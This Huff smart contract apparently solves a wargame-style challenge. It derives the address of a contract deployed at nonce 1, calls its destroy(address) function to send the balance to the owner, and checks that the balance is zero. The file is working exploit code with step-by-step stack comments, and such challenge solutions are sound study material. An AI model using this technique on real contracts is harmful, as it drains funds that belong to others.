// Storage 
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant INSTANCE_SLOT = FREE_STORAGE_POINTER()

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] OWNER_SLOT is the 0th slot in storage
    sstore          // [] - sstore consumes top 2 stack items. The first item is
                    // the key (storage location) and the second item is the value (item to store)

    // Copy constructor argument (address) into memory
    0x20            // [0x20] - This will be the size for the the code we will copy to memory
    dup1            // [0x20, 0x20] - This will be used to calculate offset for which we will copy code from current environment
    codesize        // [code_size, 0x20, 0x20] - codesize pushes the size of code in current environment on to stack
    sub             // [offset, 0x20] - sub consumes top two items off stack and subtracts item 1 from item 2. Used to calculate offset for codecopy
    returndatasize  // [0x00, offset, 0x20] - 0x00 is the destination offset in memory for the code we will copy
    codecopy        // [] - codecopy consumes top 3 items off stack. codecopy(destOffset, offset, size)

    // Copy address from memory into INSTANCE_SLOT in storage
    returndatasize  // [0x00] - This is the offset in memory for which to copy 32 bytes from (our address param) 
    mload           // [address_param] - mload consumes top item off stack and pushes 32 bytes from that offset in memory onto stack => mload(offset)
    [INSTANCE_SLOT] // [0x01, address_param] - INSTANCE_SLOT is the 1st storage slot where we will store address_param
    sstore          // [] - sstore consumes top two items off stack. sstore(key, value)
}

// Modifier
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [msg.sender]
    [OWNER_SLOT]    // [0x00] - storage slot where owner is stored
    sload           // [owner] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here is the caller is the owner
}

// Attack function
#define macro ATTACK() = takes(0) returns (0) {
    // Compute rlp encoded address and append nonce (0x01)
    // See this for more info: https://github.com/pentagonxyz/huffmate/blob/e870794b7ef4f8d53e0466e37ef53470ea489b19/src/utils/CREATE3.huff
    [INSTANCE_SLOT]    // [0x01] - storage slot where instance address is
    sload              // [instance] - copied instance onto stack from storage slot 0x01
    0x50               // [0x50, instance] - # bytes to shift instance left
    shl                // [0000_instance_000..] - shifted instance to left by 0x50 bits
                       // 0000274b028b03a250ca03644e6c578d81f019ee132300000000000000000000 

    __RIGHTPAD(0xd694) // [0xd694..., 0000_instance_000...] - right padded rlp repfix and length
    or                 // [[0xd694][instance]] - 0xd694 and instance were concatenated together
                       // 0000274b028b03a250ca03644e6c578d81f019ee132300000000000000000000
                       // d694000000000000000000000000000000000000000000000000000000000000
                       // d694274b028b03a250ca03644e6c578d81f019ee132300000000000000000000

    0x01               // [0x01, [0xd694][instance]] - nonce 
    0x48               // [0x48, 0x01, [0xd694][instance]] - # bytes to shift nonce left
    shl                // [1000000000000000000, [0xd694][instance]] - shifted 0x01 by 0x48 bits
    or                 // [[0xd694][instance][0x01]] - concatenated 0x01 to rlp encoded address
                       // d694274b028b03a250ca03644e6c578d81f019ee132300000000000000000000
                       // 0000000000000000000000000000000000000000000001000000000000000000 
                       // d694274b028b03a250ca03644e6c578d81f019ee132301000000000000000000
    0x00               // [0x00, [0xd694][instance][0x01]] - byte offset
    mstore             // [] - copied rlp encoded address + nonce to memory starting at offset 0x00

    // MEMORY:
    // [OFFSET 0]  d694274b028b03a250ca03644e6c578d81f019ee132301000000000000000000 -> rlp encoded address + nonce

    // Hash the packed rlp encoded address + nonce
    0x17              // [0x17] - size of data in memory to hash
    0x00              // [0x00, 0x17] - byte offset in memory where data to hash starts
    sha3              // [hash] - hash of data. computed address     => 07188eeb58d7f890d8d31341a26f469e9df25bb23895be0db758a320116a2ad6

    // Clean top 12 bytes by bit shifting
    0x60             //[0x60, hash] - # bits to shift left
    shl              // [hash_] - shifted hash 0x60 bits to the left => a26f469e9df25bb23895be0db758a320116a2ad6000000000000000000000000
    0x60             // [0x60, hash_] - # of bits to shift right
    shr              // [address] - shifted hash 0x60 bits to right  => 000000000000000000000000a26f469e9df25bb23895be0db758a320116a2ad6

    // Copy `destroy(address)` func sig and owner into memory to use as calldata for CALL
    0x00f55d9d       // [0x00f55d9d, address] - func sig for `destroy(address)`
    0x00             // [0x00, 0x00f55d9d, address] - byte offset
    mstore           // [address] - copied func sig into memory starting at offset 0x00
    [OWNER_SLOT]     // [0x00, address] - storage slot where owner address is
    sload            // [owner, address] - copied owner address onto stack from storage slot 0x00
    0x20             // [0x20, owner, address] - byte offset
    mstore           // [address] - copied owner address into memory starting at offset 0x20

    // MEMORY:
    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000000f55d9d -> func sig
    // [OFFSET 32] 0000000000000000000000001e59ce931b4cfea3fe4b875411e280e173cb7a9c -> owner

    // CALL into address
    0x00            // [0x00, address] - size of return data (none)
    0x00            // [0x00, 0x00, address] - byte offset in memory where return data is copied
    0x24            // [0x24, 0x00, 0x00, address] - size of calldata
    0x1c            // [0x1c, 0x24, 0x00, 0x00, address] - byte offset in memory where calldata starts
    0x00            // [value, 0x1c, 0x24, 0x00, 0x00, address] - msg.value to send with call (none)
    dup6            // [address, value, 0x1c, 0x24, 0x00, 0x00, address] - calling address
    gas             // [gas, address, value, 0x1c, 0x24, 0x00, 0x00, address] - gas to send with call (gaslef())
    call            // [success, address] - consumes 7 top items and pushes 1 onto stack if call did not revert, 0 otherwise
    iszero          // [0/1, addres]
    throw_error     // [throw_error, 0/1, address]
    jumpi           // [address]

    // Check address balance and verify it is 0
    balance         // [address_bal] - gives the wei balance of the given address/account
    throw_error     // [throw_error, address_bal]
    jumpi           // [] - will revert if balance is not 0
}

// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1         // [func_sig, func_sig]
    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    attack       // [attack_label, 0/1, func_sig] - attack_label is a label (byte offset) for the attack instructions
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    throw_error: // label for revert path
        0x00 0x00 revert

    attack:      // label for attack instructions
        ONLY_OWNER()
        ATTACK()
}
